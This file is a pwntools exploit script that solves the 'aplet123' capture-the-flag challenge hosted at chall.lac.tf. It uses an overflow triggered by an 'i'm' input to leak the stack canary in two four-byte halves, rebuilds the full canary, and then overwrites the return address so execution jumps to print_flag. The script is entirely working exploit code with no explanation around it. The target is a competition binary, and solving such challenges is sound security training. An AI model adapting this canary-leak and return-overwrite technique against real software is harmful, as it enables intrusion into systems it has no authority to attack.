#!/usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './aplet123'
elf = context.binary = ELF(exe, checksec=True)
# libc = '/usr/lib/libc.so.6'
# libc = ELF(libc, checksec=False)
context.log_level = 'debug'
host, port = 'chall.lac.tf', 31123

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
canary
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()
    rop = ROP(exe)

    offset = 69
    payload = flat({
        offset: [
            b'i\'m'
        ]
    })

    io.sendlineafter(b'\n', payload)
    io.recvuntil(b'hi ')
    second_half = u32(io.recvn(4).ljust(4, b'\x00'))
    log.info("Second half: %#x", second_half)

    payload = flat({
        offset + 3: [
            b'i\'m'
        ]
    })
    io.sendlineafter(b'\n', payload)
    io.recvuntil(b'hi ')
    first_half = u32(io.recvn(4).ljust(4, b'\x00'))
    log.info("First half: %#x", first_half)

    # Isolate the last 3 bytes of the second half and pad with 0x00
    last_three_bytes_padded = (second_half & 0xFFFFFF) << 8

    # Combine with the first half
    canary = (first_half << 32) | last_three_bytes_padded
    log.success('Full canary: %#x', canary)

    payload = flat({
        offset + 3: [
            canary,
            0,
            elf.sym['print_flag']
        ]
    })
    
    io.sendline(payload)
    io.sendline(b'bye')

    io.interactive()
    
if __name__ == '__main__':
    exploit()